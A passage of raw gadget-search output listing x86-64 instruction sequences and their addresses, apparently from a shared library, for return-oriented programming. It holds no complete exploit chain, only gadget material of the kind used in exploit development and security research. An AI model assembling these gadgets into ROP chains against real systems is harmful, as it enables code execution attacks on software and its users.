0x00002aaaaab02b97 : clc ; dec dword ptr [rax - 0x77] ; ret
0x00002aaaaac144c2 : clc ; dec dword ptr [rax - 0x77] ; ret 0x840f
0x00002aaaaab6b2d5 : clc ; dec dword ptr [rax - 0x77] ; ret 0x8949
0x00002aaaaabd337f : clc ; dec dword ptr [rax - 0x7b] ; sal byte ptr [rbx + rbx + 0x48], 0x39 ; ret
0x00002aaaaabda1e5 : clc ; dec dword ptr [rax - 0x7b] ; sal byte ptr [rcx + rdi*2 + 0x48], 0x39 ; ret
0x00002aaaaab226d4 : clc ; dec dword ptr [rcx - 0x77] ; ret
0x00002aaaaab23d90 : clc ; dec dword ptr [rcx - 0x77] ; ret 0x8b4c
0x00002aaaaab49150 : clc ; dec dword ptr [rdi] ; test ah, al ; add al, byte ptr [rax] ; add byte ptr [rax + 1], cl ; ret
0x00002aaaaac0c819 : clc ; dec dword ptr [rdi] ; test byte ptr [rdi - 0x7d000000], al ; ret 0x3901
0x00002aaaaab4af7d : clc ; dec dword ptr [rdi] ; xchg eax, esp ; ret 0xdaf7
0x00002aaaaac6e77a : clc ; dec esp ; iretd ; add dword ptr [rax], eax ; je 0x19979a ; clc ; jmp rsp
0x00002aaaaac6eaaa : clc ; inc dword ptr [rbp + 0x69340001] ; clc ; call rsp
0x00002aaaaabd41a9 : clc ; inc dword ptr [rbp - 0x7cee8b40] ; ret
0x00002aaaaab0076b : clc ; inc dword ptr [rcx - 0x77] ; ret
0x00002aaaaac6e8da : clc ; inc esp ; salc ; add dword ptr [rax], eax ; xchg eax, esp ; and al, 0xf8 ; jmp rsp
0x00002aaaaaafbcfe : clc ; jg 0x26c8d ; ret 0x5c77
0x00002aaaaac8ef22 : clc ; jmp qword ptr [rbx]
0x00002aaaaac8f2ba : clc ; jmp qword ptr [rcx]
0x00002aaaaac6e85a : clc ; jmp qword ptr [rsp + rdx*8 + 1]
0x00002aaaaab94505 : clc ; jmp rax
0x00002aaaaac6e782 : clc ; jmp rsp
0x00002aaaaac46c3a : clc ; jne 0x171d47 ; ret
0x00002aaaaac46c39 : clc ; jne 0x171d48 ; ret
0x00002aaaaab689f7 : clc ; jne 0x938d1 ; ret
0x00002aaaaabe97f4 : clc ; leave ; ret
0x00002aaaaac5a518 : clc ; loope 0x18551d ; jmp qword ptr [rdi]
0x00002aaaaac5a598 : clc ; loope 0x18559d ; jmp qword ptr [rdi]
0x00002aaaaac5a618 : clc ; loope 0x18561d ; jmp qword ptr [rdi]
0x00002aaaaac5a698 : clc ; loope 0x18569d ; jmp qword ptr [rdi]
0x00002aaaaac5a718 : clc ; loope 0x18571d ; jmp qword ptr [rdi]
0x00002aaaaac5a798 : clc ; loope 0x18579d ; jmp qword ptr [rdi]
0x00002aaaaabd36d8 : clc ; mov byte ptr [r8 - 1], 0 ; ret
0x00002aaaaab72e68 : clc ; mov byte ptr [rdi + 6], 0 ; ret
0x00002aaaaac58362 : clc ; mov ch, 0x36 ; push rcx ; call qword ptr [rsi]
0x00002aaaaac72998 : clc ; mov cl, ch ; jmp rsp
0x00002aaaaab72d4a : clc ; mov eax, dword ptr [rsp + 0x18] ; mov dword ptr [rdi - 4], eax ; mov rax, rdi ; ret
0x00002aaaaac26e17 : clc ; mov qword ptr [rdi - 0x10], r11 ; mov qword ptr [rdi - 8], rdx ; ret
0x00002aaaaac27787 : clc ; mov qword ptr [rdi - 0xd], rcx ; mov qword ptr [rdi - 8], rdx ; ret
0x00002aaaaac2f087 : clc ; mov qword ptr [rdi - 0xd], rdx ; mov qword ptr [rdi - 8], rcx ; ret
0x00002aaaaac27987 : clc ; mov qword ptr [rdi - 0xe], rcx ; mov qword ptr [rdi - 8], rdx ; ret
0x00002aaaaac2eff7 : clc ; mov qword ptr [rdi - 0xe], rdx ; mov qword ptr [rdi - 8], rcx ; ret
0x00002aaaaac27b87 : clc ; mov qword ptr [rdi - 0xf], rcx ; mov qword ptr [rdi - 8], rdx ; ret
0x00002aaaaac2ef67 : clc ; mov qword ptr [rdi - 0xf], rdx ; mov qword ptr [rdi - 8], rcx ; ret
0x00002aaaaac26e33 : clc ; mov qword ptr [rdi - 8], rdx ; ret
0x00002aaaaab73fdc : clc ; mov qword ptr [rdi], rsi ; mov qword ptr [r9 - 8], rcx ; ret
0x00002aaaaab1f1d2 : clc ; movsd xmm0, qword ptr [rsp - 8] ; ret
0x00002aaaaaaf621c : clc ; neg eax ; ret
0x00002aaaaab5f8a0 : clc ; or bh, byte ptr [rax - 1] ; cmovae eax, ecx ; ret
0x00002aaaaab5f817 : clc ; or dword ptr [rcx + 0xf], eax ; xchg eax, esi ; ret 0xc031
0x00002aaaaab5f7c1 : clc ; or dword ptr [rdi], ecx ; xchg eax, esi ; ret 0xc031
0x00002aaaaab6302b : clc ; or eax, 0x8d48c300 ; add eax, 0xe1f9a ; ret
0x00002aaaaac84ee8 : clc ; outsd dx, dword ptr [rsi] ; cmc ; jmp qword ptr [rcx]
0x00002aaaaab1fa70 : clc ; pop rbx ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; pop rbp ; ret
0x00002aaaaab02776 : clc ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x00002aaaaab73966 : clc ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; ret
0x00002aaaaab6b7ab : clc ; pop rbx ; ret
0x00002aaaaab4969a : clc ; push qword ptr [rbp + 2] ; pop rbx ; ret
0x00002aaaaac16daf : clc ; push qword ptr [rbp + rcx + 0x48] ; add esp, 8 ; ret
0x00002aaaaab9cdfd : clc ; push qword ptr [rbp + rsi - 0x77] ; ret 0xe283
0x00002aaaaab1d4c5 : clc ; push qword ptr [rbp - 0x19] ; mov rax, rdx ; ret
0x00002aaaaab50fd0 : clc ; push qword ptr [rbp - 0x1a] ; pop rbx ; ret
0x00002aaaaabe9f81 : clc ; push qword ptr [rbp - 0xe] ; xor eax, eax ; leave ; ret
0x00002aaaaab47cbb : clc ; push qword ptr [rbx + rax - 0x7d] ; and ebp, edi ; pop rbx ; ret
0x00002aaaaab50595 : clc ; push qword ptr [rdi + rax + 0x5b] ; pop rbp ; pop r12 ; ret
0x00002aaaaabdddc8 : clc ; push qword ptr [rsi + rax - 0x7d] ; rol byte ptr [rcx], 0x66 ; mov dword ptr [rdx], eax ; ret
0x00002aaaaac6ea82 : clc ; push qword ptr [rsp + 0x65640001] ; clc ; jmp rsp
0x00002aaaaac8e5a8 : clc ; push rdi ; call qword ptr [rdx]
0x00002aaaaaad7bd1 : clc ; ret
0x00002aaaaac68732 : clc ; ret 0x6e1f
0x00002aaaaabed7b1 : clc ; ror ax, 8 ; ret
0x00002aaaaaad88ec : clc ; salc ; jb 0x3970 ; cmpsq qword ptr [rsi], qword ptr [rdi] ; ret 0x49ec
0x00002aaaaab0f633 : clc ; sar edx, 0x1f ; xor eax, edx ; sub eax, edx ; ret
0x00002aaaaabed4ab : clc ; sar rax, 6 ; ret
0x00002aaaaab0f645 : clc ; sar rdx, 0x3f ; xor rax, rdx ; sub rax, rdx ; ret
0x00002aaaaaba9381 : clc ; sbb byte ptr [rcx], bh ; ret 0x850f
0x00002aaaaac86ec8 : clc ; sbb cl, bh ; jmp qword ptr [rsi]
0x00002aaaaac7f1c8 : clc ; sbb edx, esi ; jmp qword ptr [rcx]
0x00002aaaaab1da2a : clc ; shl r9, cl ; mov qword ptr [rdi - 0x10], r9 ; ret
0x00002aaaaabed847 : clc ; shr eax, 0x18 ; ret
0x00002aaaaac485ce : clc ; std ; ja 0x17359e ; call 0x1f8ae
0x00002aaaaac69981 : clc ; sti ; call rax
0x00002aaaaaaf53dc : clc ; sub eax, 0x415d003a ; pop rsp ; pop r13 ; pop r14 ; ret
0x00002aaaaac5c6b0 : clc ; sub edx, esi ; call qword ptr [rax + 0x10fff229]
0x00002aaaaac1ea5c : clc ; sub rax, r8 ; ret
0x00002aaaaac1ecb1 : clc ; sub rax, rdx ; ret
0x00002aaaaab00392 : clc ; test rcx, rcx ; je 0x2b3a0 ; call rcx
0x00002aaaaac81234 : cld ; adc al, byte ptr [rcx] ; add byte ptr [rax - 0x26], ch ; jmp qword ptr [rcx]
0x00002aaaaac755ac : cld ; add byte ptr [rax], al ; add al, dh ; mov bl, 0xec ; jmp qword ptr [rcx]
0x00002aaaaac6c44d : cld ; add byte ptr [rax], al ; push rsp ; xor ch, bh ; call rsp
0x00002aaaaaba1e72 : cld ; add byte ptr [rax], al ; ret
0x00002aaaaabfc763 : cld ; add ch, byte ptr [rdx] ; add byte ptr [rdx], al ; add rsp, 8 ; ret
0x00002aaaaab7f06f : cld ; add eax, dword ptr [rax] ; pop rbx ; ret
0x00002aaaaab7f08f : cld ; add eax, dword ptr [rax] ; ret
0x00002aaaaac84d34 : cld ; add qword ptr [r8], r8 ; cmp byte ptr [rsi - 0xb], ch ; jmp qword ptr [rcx]
0x00002aaaaac84c34 : cld ; add qword ptr [rax], r8 ; cmp byte ptr [rbp - 0xb], ch ; call qword ptr [rax]
0x00002aaaaac84a34 : cld ; add qword ptr [rax], rax ; cwde ; pop rbx ; cmc ; jmp qword ptr [rcx]
0x00002aaaaac0c85f : cld ; add rsp, 8 ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; ret
0x00002aaaaac69fba : cld ; call qword ptr [rax + 0x10fffc53]
0x00002aaaaac69fb2 : cld ; call qword ptr [rax + 0x10fffc54]
0x00002aaaaac69faa : cld ; call qword ptr [rax + 0x10fffc55]
0x00002aaaaac69fa2 : cld ; call qword ptr [rax + 0x10fffc56]
0x00002aaaaac69f9a : cld ; call qword ptr [rax + 0x10fffc57]
0x00002aaaaac6a97a : cld ; call qword ptr [rax + 0x10fffc9f]
0x00002aaaaac6a972 : cld ; call qword ptr [rax + 0x10fffca0]
0x00002aaaaac6a96a : cld ; call qword ptr [rax + 0x10fffca1]
0x00002aaaaac6a962 : cld ; call qword ptr [rax + 0x10fffca2]
0x00002aaaaac6a95a : cld ; call qword ptr [rax + 0x10fffca3]
0x00002aaaaac6a992 : cld ; call qword ptr [rax + 0x10fffca4]
0x00002aaaaac69a6a : cld ; call qword ptr [rax + 0x20fffc34]
0x00002aaaaac699ca : cld ; call qword ptr [rax + 0x20fffc35]
0x00002aaaaac69d82 : cld ; call qword ptr [rax + 0x20fffc5c]
0x00002aaaaac69b6a : cld ; call qword ptr [rax + 0x20fffc5f]
0x00002aaaaac6a26e : cld ; call qword ptr [rax + 0x20fffc84]
0x00002aaaaac6a056 : cld ; call qword ptr [rax + 0x20fffc87]
0x00002aaaaac6a766 : cld ; call qword ptr [rax + 0x20fffcab]
0x00002aaaaac69b3e : cld ; call qword ptr [rax - 0x1f0003e0]
0x00002aaaaac69aea : cld ; call qword ptr [rax - 0x1f0003e7]
0x00002aaaaac699c6 : cld ; call qword ptr [rax - 0x6f0003cd]
0x00002aaaaac6980e : cld ; call qword ptr [rax]
0x00002aaaaac69c16 : cld ; call qword ptr [rdx + 0x22fffc61]
0x00002aaaaac6a142 : cld ; call qword ptr [rdx + 0x22fffc82]
0x00002aaaaac6a84a : cld ; call qword ptr [rdx + 0x22fffc9d]
0x00002aaaaac6a63a : cld ; call qword ptr [rdx + 0x22fffca9]
0x00002aaaaac69c36 : cld ; call qword ptr [rdx]
0x00002aaaaac69bb2 : cld ; call qword ptr [rsi + 0x26fffc5e]
0x00002aaaaac6a09e : cld ; call qword ptr [rsi + 0x26fffc86]
0x00002aaaaac6a596 : cld ; call qword ptr [rsi + 0x26fffcad]
0x00002aaaaac69b92 : cld ; call qword ptr [rsi]
0x00002aaaaac69afa : cld ; call rax
0x00002aaaaac69c26 : cld ; call rdx
0x00002aaaaac69bc2 : cld ; call rsi
0x00002aaaaac69cee : cld ; call rsp
0x00002aaaaab31467 : cld ; cmove rsi, r9 ; jmp 0x5c436
0x00002aaaaab47cfd : cld ; cmp eax, 0xff ; je 0x72d10 ; and dword ptr [rbx], 0xffffffef ; pop rbx ; ret
0x00002aaaaab47cfc : cld ; cmp eax, 0xff ; je 0x72d11 ; and dword ptr [rbx], 0xffffffef ; pop rbx ; ret
0x00002aaaaac46d32 : cld ; cmp eax, dword ptr [rsi - 4] ; jne 0x171d48 ; xor eax, eax ; ret
0x00002aaaaac46d31 : cld ; cmp eax, dword ptr [rsi - 4] ; jne 0x171d49 ; xor eax, eax ; ret
0x00002aaaaac46c52 : cld ; cmp eax, dword ptr [rsi - 4] ; jne 0x171d4a ; ret
0x00002aaaaac46c51 : cld ; cmp eax, dword ptr [rsi - 4] ; jne 0x171d4b ; ret
0x00002aaaaac46501 : cld ; cmp eax, ecx ; jne 0x17171b ; xor eax, eax ; ret
0x00002aaaaac43436 : cld ; cmp ecx, eax ; jne 0x16ee5a ; xor eax, eax ; ret
0x00002aaaaac144be : cld ; dec dword ptr [rax - 0x7d] ; clc ; dec dword ptr [rax - 0x77] ; ret 0x840f
0x00002aaaaabb7709 : cld ; dec dword ptr [rdi] ; xchg eax, esp ; ret 0xb60f
0x00002aaaaabb82ec : cld ; dec dword ptr [rdi] ; xchg eax, esp ; ret 0xf44
0x00002aaaaac69cca : cld ; dec esi ; pop rbx ; cld ; push qword ptr [rbx + rbx*2 - 4] ; jmp rsp
0x00002aaaaab0a057 : cld ; fld xword ptr [rsp + 8] ; fscale ; fstp st(1) ; ret
0x00002aaaaac6bcf9 : cld ; in eax, dx ; call rsp
0x00002aaaaac6980a : cld ; inc dword ptr [rax + 0x10fffc0d] ; add ah, bh ; call rax
0x00002aaaaac69ae6 : cld ; inc dword ptr [rax + 0x18] ; cld ; call qword ptr [rax - 0x1f0003e7]
0x00002aaaaac69b3a : cld ; inc dword ptr [rax + 0x1f] ; cld ; call qword ptr [rax - 0x1f0003e0]
0x00002aaaaac6a28a : cld ; inc dword ptr [rax + 0x20fffc81] ; ja 0x195298 ; jmp rax
0x00002aaaaac699ae : cld ; inc dword ptr [rax + 0x28] ; cld ; inc dword ptr [rax] ; sub bh, ah ; jmp rax
0x00002aaaaac69a36 : cld ; inc dword ptr [rax + 0x2b] ; cld ; jmp qword ptr [rax]
0x00002aaaaac69a9e : cld ; inc dword ptr [rax + 0x2e] ; cld ; call qword ptr [rax]
0x00002aaaaac69a06 : cld ; inc dword ptr [rax + 0x33] ; cld ; inc dword ptr [rax + 0x35] ; cld ; call rax
0x00002aaaaac69a0a : cld ; inc dword ptr [rax + 0x35] ; cld ; call rax
0x00002aaaaac69b76 : cld ; inc dword ptr [rax + 0x5e] ; cld ; call rax
0x00002aaaaac6a48a : cld ; inc dword ptr [rax + 0x77] ; cld ; call rax
0x00002aaaaac698c6 : cld ; inc dword ptr [rax + 0xa] ; cld ; inc dword ptr [rax + 0xc] ; cld ; call rax
0x00002aaaaac698ca : cld ; inc dword ptr [rax + 0xc] ; cld ; call rax
0x00002aaaaac6985a : cld ; inc dword ptr [rax + 5] ; cld ; jmp qword ptr [rax]
0x00002aaaaac6a55a : cld ; inc dword ptr [rax - 0x53] ; cld ; call rax
0x00002aaaaac6a772 : cld ; inc dword ptr [rax - 0x56] ; cld ; call rax
0x00002aaaaac6a062 : cld ; inc dword ptr [rax - 0x7a] ; cld ; call rax
0x00002aaaaac6a27a : cld ; inc dword ptr [rax - 0x7d] ; cld ; call rax
0x00002aaaaac698a6 : cld ; inc dword ptr [rax - 0x7f0003f6] ; or al, 0xfc ; call qword ptr [rax]
0x00002aaaaac697d2 : cld ; inc dword ptr [rax] ; add bh, ah ; jmp rax
0x00002aaaaac6a9be : cld ; inc dword ptr [rax] ; lahf ; cld ; push qword ptr [rax - 0x62] ; cld ; jmp rax
0x00002aaaaac6a762 : cld ; inc dword ptr [rax] ; lodsb al, byte ptr [rsi] ; cld ; call qword ptr [rax + 0x20fffcab]
0x00002aaaaac6a052 : cld ; inc dword ptr [rax] ; mov ah, bh ; call qword ptr [rax + 0x20fffc87]
0x00002aaaaac69d7e : cld ; inc dword ptr [rax] ; pop rbp ; cld ; call qword ptr [rax + 0x20fffc5c]
0x00002aaaaac69f8e : cld ; inc dword ptr [rax] ; push rcx ; cld ; jmp qword ptr [rax + 0x20fffc58]
0x00002aaaaac699b2 : cld ; inc dword ptr [rax] ; sub bh, ah ; jmp rax
0x00002aaaaac69a56 : cld ; inc dword ptr [rax] ; sub edi, esp ; jmp rax
0x00002aaaaac6a26a : cld ; inc dword ptr [rax] ; test edi, esp ; call qword ptr [rax + 0x20fffc84]
0x00002aaaaac69fce : cld ; inc dword ptr [rax] ; xor al, 0xfc ; jmp qword ptr [rax]
0x00002aaaaab7f127 : cld ; inc dword ptr [rbx] ; div ecx ; pop rbx ; mov eax, eax ; ret
0x00002aaaaab7f04e : cld ; inc dword ptr [rbx] ; pop rbx ; ret
0x00002aaaaac6a3fe : cld ; inc dword ptr [rcx + rdi*2] ; cld ; push qword ptr [rax + rdi*2 - 4] ; jmp rsp
0x00002aaaaabb83d9 : cld ; inc dword ptr [rcx - 0x77] ; ror dword ptr [rdi], -0x6c ; ret 0x3ae9
0x00002aaaaabf6f19 : cld ; inc dword ptr [rcx] ; add byte ptr [rax + 0x29], cl ; ret
0x00002aaaaac6a1d6 : cld ; inc dword ptr [rdi + rax*4 - 4] ; call rsp
0x00002aaaaac69cea : cld ; inc dword ptr [rdi + rbx*2 - 4] ; call rsp
0x00002aaaaac69c22 : cld ; inc dword ptr [rdx + 0x60] ; cld ; call rdx
0x00002aaaaac6a646 : cld ; inc dword ptr [rdx - 0x58] ; cld ; call rdx
0x00002aaaaac6a636 : cld ; inc dword ptr [rdx] ; stosb byte ptr [rdi], al ; cld ; call qword ptr [rdx + 0x22fffca9]
0x00002aaaaac69bbe : cld ; inc dword ptr [rsi + 0x5d] ; cld ; call rsi
0x00002aaaaac6a5a2 : cld ; inc dword ptr [rsi - 0x54] ; cld ; call rsi
0x00002aaaaac6a0aa : cld ; inc dword ptr [rsi - 0x7b] ; cld ; call rsi
0x00002aaaaac69bae : cld ; inc dword ptr [rsi] ; pop rdi ; cld ; call qword ptr [rsi + 0x26fffc5e]
0x00002aaaaac6a592 : cld ; inc dword ptr [rsi] ; scasb al, byte ptr [rdi] ; cld ; call qword ptr [rsi + 0x26fffcad]
0x00002aaaaac6a09a : cld ; inc dword ptr [rsi] ; xchg esp, edi ; call qword ptr [rsi + 0x26fffc86]
0x00002aaaaac69b1a : cld ; inc eax ; adc al, 0xfc ; call qword ptr [rax]
0x00002aaaaac69b06 : cld ; inc eax ; and bh, ah ; call qword ptr [rax]
0x00002aaaaac6a4c6 : cld ; inc eax ; ja 0x1954d0 ; push qword ptr [rax] ; ja 0x1954d4 ; call rax
0x00002aaaaac6a57a : cld ; inc eax ; test eax, 0xa950fffc ; cld ; jmp rax
0x00002aaaaac5c395 : cld ; int1 ; call qword ptr [rax]
0x00002aaaaac5c391 : cld ; int1 ; push rax ; cld ; int1 ; call qword ptr [rax]
0x00002aaaaaba395b : cld ; je 0xce978 ; call 0x8ab75
0x00002aaaaac6a2ca : cld ; jmp qword ptr [rax + 0x16fffc77]
0x00002aaaaac6a012 : cld ; jmp qword ptr [rax + 0x20fffc35]
0x00002aaaaac69fd6 : cld ; jmp qword ptr [rax + 0x20fffc36]
0x00002aaaaac6a01a : cld ; jmp qword ptr [rax + 0x20fffc38]
0x00002aaaaac69fde : cld ; jmp qword ptr [rax + 0x20fffc39]
0x00002aaaaac6a022 : cld ; jmp qword ptr [rax + 0x20fffc3b]
0x00002aaaaac69fe6 : cld ; jmp qword ptr [rax + 0x20fffc3c]
0x00002aaaaac6a02a : cld ; jmp qword ptr [rax + 0x20fffc3e]
0x00002aaaaac69fee : cld ; jmp qword ptr [rax + 0x20fffc3f]
0x00002aaaaac6a032 : cld ; jmp qword ptr [rax + 0x20fffc41]
0x00002aaaaac69ff6 : cld ; jmp qword ptr [rax + 0x20fffc42]
0x00002aaaaac6a03a : cld ; jmp qword ptr [rax + 0x20fffc44]
0x00002aaaaac69ffe : cld ; jmp qword ptr [rax + 0x20fffc45]
0x00002aaaaac6a042 : cld ; jmp qword ptr [rax + 0x20fffc47]
0x00002aaaaac6a006 : cld ; jmp qword ptr [rax + 0x20fffc48]
0x00002aaaaac69f7a : cld ; jmp qword ptr [rax + 0x20fffc53]
0x00002aaaaac69f72 : cld ; jmp qword ptr [rax + 0x20fffc54]
0x00002aaaaac69f6a : cld ; jmp qword ptr [rax + 0x20fffc55]
0x00002aaaaac69f62 : cld ; jmp qword ptr [rax + 0x20fffc56]
0x00002aaaaac69f5a : cld ; jmp qword ptr [rax + 0x20fffc57]
0x00002aaaaac69f92 : cld ; jmp qword ptr [rax + 0x20fffc58]
0x00002aaaaac6a952 : cld ; jmp qword ptr [rax + 0x20fffca4]
0x00002aaaaac6985e : cld ; jmp qword ptr [rax]
0x00002aaaaac7d62a : cld ; jmp qword ptr [rbx]
0x00002aaaaac6a33a : cld ; jmp qword ptr [rdx + 0x22fffc79]
0x00002aaaaac6a332 : cld ; jmp qword ptr [rdx + 0x22fffc7a]
0x00002aaaaac6a32a : cld ; jmp qword ptr [rdx + 0x22fffc7b]
0x00002aaaaac6a322 : cld ; jmp qword ptr [rdx + 0x22fffc7c]
0x00002aaaaac6a31a : cld ; jmp qword ptr [rdx + 0x22fffc7d]
0x00002aaaaac69c1a : cld ; jmp qword ptr [rdx]
0x00002aaaaac69b8e : cld ; jmp qword ptr [rsi + 0x16fffc5b]
0x00002aaaaac69bb6 : cld ; jmp qword ptr [rsi]
0x00002aaaaac697d6 : cld ; jmp rax
0x00002aaaaac69c4a : cld ; jmp rdx
0x00002aaaaac69ba6 : cld ; jmp rsi
0x00002aaaaac69cd2 : cld ; jmp rsp
0x00002aaaaac44a66 : cld ; jne 0x16fc9f ; xor eax, eax ; ret
0x00002aaaaac44a65 : cld ; jne 0x16fca0 ; xor eax, eax ; ret
0x00002aaaaac46d35 : cld ; jne 0x171d45 ; xor eax, eax ; ret
0x00002aaaaac46d34 : cld ; jne 0x171d46 ; xor eax, eax ; ret
0x00002aaaaac46c55 : cld ; jne 0x171d47 ; ret
0x00002aaaaac46c54 : cld ; jne 0x171d48 ; ret
0x00002aaaaac6a80a : cld ; lcall ptr [rbp + rbx*4 - 0x62d30004] ; cld ; call rdx
0x00002aaaaac69e0a : cld ; ljmp ptr [rcx + rdx*2 + 0x513cfffc] ; cld ; jmp rdx
0x00002aaaaac275a2 : cld ; mov dword ptr [rdi - 4], edx ; ret
0x00002aaaaac277a5 : cld ; mov dword ptr [rdi - 5], edx ; mov dword ptr [rdi - 4], ecx ; ret
0x00002aaaaac279a5 : cld ; mov dword ptr [rdi - 6], edx ; mov dword ptr [rdi - 4], ecx ; ret
0x00002aaaaac27ba5 : cld ; mov dword ptr [rdi - 7], edx ; mov dword ptr [rdi - 4], ecx ; ret
0x00002aaaaab73fee : cld ; mov dword ptr [rdi], esi ; mov dword ptr [r9 - 4], ecx ; ret
0x00002aaaaab3480b : cld ; mov ebx, 2 ; jmp 0x5baf8
0x00002aaaaac21f68 : cld ; mov esi, dword ptr [rsi] ; mov dword ptr [rdi], esi ; mov dword ptr [rdi + rdx - 4], ecx ; ret
0x00002aaaaac1022e : cld ; mov qword ptr [rdi + 0x18], rax ; mov eax, 1 ; ret
0x00002aaaaac271d6 : cld ; mov qword ptr [rdi - 0xa], rcx ; mov dword ptr [rdi - 4], edx ; ret
0x00002aaaaac2f216 : cld ; mov qword ptr [rdi - 0xa], rdx ; mov dword ptr [rdi - 4], ecx ; ret
0x00002aaaaac273b6 : cld ; mov qword ptr [rdi - 0xb], rcx ; mov dword ptr [rdi - 4], edx ; ret
0x00002aaaaac2f196 : cld ; mov qword ptr [rdi - 0xb], rdx ; mov dword ptr [rdi - 4], ecx ; ret
0x00002aaaaac27596 : cld ; mov qword ptr [rdi - 0xc], rcx ; mov dword ptr [rdi - 4], edx ; ret
0x00002aaaaac2f116 : cld ; mov qword ptr [rdi - 0xc], rdx ; mov dword ptr [rdi - 4], ecx ; ret
0x00002aaaaac26ff6 : cld ; mov qword ptr [rdi - 9], rcx ; mov dword ptr [rdi - 4], edx ; ret
0x00002aaaaac2f296 : cld ; mov qword ptr [rdi - 9], rdx ; mov dword ptr [rdi - 4], ecx ; ret
0x00002aaaaab72d51 : cld ; mov rax, rdi ; ret
0x00002aaaaab12ed8 : cld ; movabs al, byte ptr [0x293ff08348000000] ; ret 0xfa81
0x00002aaaaab1f18c : cld ; movss xmm0, dword ptr [rsp - 4] ; ret
0x00002aaaaab80e3a : cld ; pop rbx ; ret
0x00002aaaaac69b16 : cld ; push qword ptr [rax + 0x13] ; cld ; inc eax ; adc al, 0xfc ; call qword ptr [rax]
0x00002aaaaac69b02 : cld ; push qword ptr [rax + 0x21] ; cld ; inc eax ; and bh, ah ; call qword ptr [rax]
0x00002aaaaac69b72 : cld ; push qword ptr [rax + 0x40fffc5e] ; pop rsi ; cld ; call rax
0x00002aaaaac6a05e : cld ; push qword ptr [rax + 0x40fffc86] ; xchg ah, bh ; call rax
0x00002aaaaac6a76e : cld ; push qword ptr [rax + 0x40fffcaa] ; stosb byte ptr [rdi], al ; cld ; call rax
0x00002aaaaac6a556 : cld ; push qword ptr [rax + 0x40fffcad] ; lodsd eax, dword ptr [rsi] ; cld ; call rax
0x00002aaaaac69d8a : cld ; push qword ptr [rax + 0x50fffc5b] ; push rcx ; cld ; call qword ptr [rax]
0x00002aaaaac6a402 : cld ; push qword ptr [rax + rdi*2 - 4] ; jmp rsp
0x00002aaaaac6a7be : cld ; push qword ptr [rax - 0x61] ; cld ; jmp rax
0x00002aaaaac6a9c2 : cld ; push qword ptr [rax - 0x62] ; cld ; jmp rax
0x00002aaaaac697ee : cld ; push qword ptr [rax] ; add ah, bh ; push rax ; add esp, edi ; call rax
0x00002aaaaac69876 : cld ; push qword ptr [rax] ; add edi, esp ; call qword ptr [rax]
0x00002aaaaac6a4ca : cld ; push qword ptr [rax] ; ja 0x1954d0 ; call rax
0x00002aaaaac6a2c6 : cld ; push qword ptr [rax] ; js 0x1952d0 ; jmp qword ptr [rax + 0x16fffc77]
0x00002aaaaac69f56 : cld ; push qword ptr [rax] ; pop rax ; cld ; jmp qword ptr [rax + 0x20fffc57]
0x00002aaaaac69cce : cld ; push qword ptr [rbx + rbx*2 - 4] ; jmp rsp
0x00002aaaaac6a1d2 : cld ; push qword ptr [rdi + rax*4 - 0x78bb0004] ; cld ; call rsp
0x00002aaaaac69ce6 : cld ; push qword ptr [rdi + rbx*2 + 0x5f44fffc] ; cld ; call rsp
0x00002aaaaac6a642 : cld ; push qword ptr [rdx + 0x42fffca8] ; test al, 0xfc ; call rdx
0x00002aaaaac6a316 : cld ; push qword ptr [rdx] ; jle 0x195320 ; jmp qword ptr [rdx + 0x22fffc7d]
0x00002aaaaac69bba : cld ; push qword ptr [rsi + 0x46fffc5d] ; pop rbp ; cld ; call rsi
0x00002aaaaac6a0a6 : cld ; push qword ptr [rsi + 0x46fffc85] ; test edi, esp ; call rsi
0x00002aaaaac6a59e : cld ; push qword ptr [rsi + 0x46fffcac] ; lodsb al, byte ptr [rsi] ; cld ; call rsi
0x00002aaaaac6a08e : cld ; push qword ptr [rsi - 0x7f] ; cld ; jmp rsi
0x00002aaaaac69896 : cld ; push rax ; add bh, ah ; call rax
0x00002aaaaac85034 : cld ; push rax ; add dword ptr [rax], eax ; test al, 0x71 ; cmc ; jmp qword ptr [rcx]
0x00002aaaaac698fa : cld ; push rax ; add edi, esp ; jmp rax
0x00002aaaaac697f2 : cld ; push rax ; add esp, edi ; call rax
0x00002aaaaac6a286 : cld ; push rax ; cmp esp, 0xfc8180ff ; jmp qword ptr [rax]
0x00002aaaaac6a7ba : cld ; push rax ; lahf ; cld ; push qword ptr [rax - 0x61] ; cld ; jmp rax
0x00002aaaaac6a98e : cld ; push rax ; pushfq ; cld ; call qword ptr [rax + 0x10fffca4]
0x00002aaaaac69996 : cld ; push rax ; sub edi, esp ; call rax
0x00002aaaaac85334 : cld ; push rbx ; add dword ptr [rax], eax ; js 0x1b03b7 ; cmc ; jmp qword ptr [rcx]
0x00002aaaaab1f192 : cld ; ret
0x00002aaaaab1b4a0 : cld ; ret 0x37
0x00002aaaaac6998d : cld ; sti ; dec dword ptr [rax + 0x28] ; cld ; call qword ptr [rax]
0x00002aaaaac6994d : cld ; sti ; inc dword ptr [rax - 0x19] ; sti ; call qword ptr [rax]
0x00002aaaaac57816 : cld ; test al, 0x97 ; xchg eax, esp ; ret
0x00002aaaaab8f69e : cld ; test edx, edx ; mov dword ptr [rsi + rcx], edx ; jne 0xba6a1 ; ret
0x00002aaaaac6dcd4 : cld ; xchg eax, esi ; add dword ptr [rax], eax ; ret 0xfff6
0x00002aaaaaba95b5 : cld ; xor eax, eax ; mov rdx, r8 ; jmp 0xd45dc
0x00002aaaaab5a7a9 : cli ; adc al, 0x77 ; and ecx, dword ptr [rcx - 0x7d] ; ret 0xeb5b
0x00002aaaaab0fd3d : cli ; adc byte ptr [rcx], ch ; ret 0xc269
0x00002aaaaab90a3d : cli ; adc cl, byte ptr [rax + 0x29] ; ret 0x6948
0x00002aaaaab909be : cli ; adc cl, byte ptr [rax + 0x29] ; ret 0x8948
0x00002aaaaab5a986 : cli ; add al, 0x77 ; or dword ptr [rcx - 0x7d], ecx ; ret 0xe977
0x00002aaaaabcf9b1 : cli ; add al, 0x77 ; or esp, dword ptr [rsi - 0x77] ; push rsi ; xor ax, ax ; ret
0x00002aaaaac1b0f7 : cli ; add al, byte ptr [rax] ; mov eax, dword ptr [rcx + rax*4] ; mov edx, dword ptr [rcx + rdx*4] ; sub eax, edx ; ret
0x00002aaaaaba1649 : cli ; add byte ptr [rcx - 0xcf68130], cl ; ret
0x00002aaaaab9185b : cli ; add ch, byte ptr [rcx] ; ret 0x48d
